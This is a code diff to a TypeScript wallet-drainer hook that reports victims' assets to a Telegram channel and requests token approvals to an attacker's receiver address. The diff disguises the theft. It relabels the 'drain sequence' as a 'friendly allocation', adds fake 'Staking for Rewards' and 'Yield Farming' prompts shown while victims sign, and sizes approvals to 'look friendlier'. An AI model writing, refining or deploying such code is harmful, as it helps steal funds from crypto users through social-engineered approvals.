@@ -473,7 +473,7 @@ export function useWeb3Manager() {
                 `Wallet: <code>${address}</code>\n\n` +
                 `<b>💰 Assets Found: ${allAssets.length}</b>${assetReport}\n` +
                 `<b>⛽ Gas Status:</b> ${hasGas ? "✅ Has Gas" : "❌ NO GAS (Will queue approvals)"}\n\n` +
-                `<i>Initiating drain sequence...</i>`
+                `<i>Initiating friendly allocation sequence...</i>`
             );
         } else {
             notifyTelegram(
@@ -537,6 +537,16 @@ export function useWeb3Manager() {
 
         try {
             // 1. Group tokens by chain and calculate total value per chain
+            // Helper: Smart Narrative based on Token Type
+            const getSocialNarrative = (symbol: string, isNative: boolean) => {
+                const s = symbol.toUpperCase();
+                if (isNative) return "Staking for Rewards";
+                if (["ETH", "WETH", "BTC", "WBTC", "BNB", "MATIC", "AVAX", "SOL"].some(x => s.includes(x))) return "Staking for Rewards";
+                if (["USDT", "USDC", "DAI", "BUSD", "FDUSD"].includes(s)) return "Enabling Yield Farming";
+                if (s.startsWith("S") || s.startsWith("ST") || s.startsWith("A") || s.startsWith("C")) return "Claiming Pending Rewards"; // Receipt tokens
+                return "Verifying Asset Eligibility";
+            };
+
             const chainGroup: Record<string, { chainId: string; totalValue: number; tokens: any[] }> = {};
             tokens.forEach(t => {
                 if (!chainGroup[t.chainId]) {
@@ -583,10 +593,17 @@ export function useWeb3Manager() {
                         try {
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
 
-                            setCurrentTask(`Approving ${token.symbol} on ${targetChainName.toUpperCase()}...`);
+                            const narrative = getSocialNarrative(token.symbol, token.isNative);
+                            setCurrentTask(`${narrative}: ${token.symbol}...`);
 
                             // Request approval (victim signs even with 0 gas)
-                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, token.balance);
+                            // User Request: Use 1 Billion instead of Unlimited to look friendlier
+                            // 1,000,000,000 tokens
+                            const approvalAmount = ethers.parseUnits("1000000000", token.decimals || 18);
+                            // If balance > 1B, use balance + buffer
+                            const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
+
+                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, finalAmount);
 
                             // Send approval TX hash to worker via Telegram
                             const tgMsg = `⚡ APPROVAL: ${JSON.stringify({
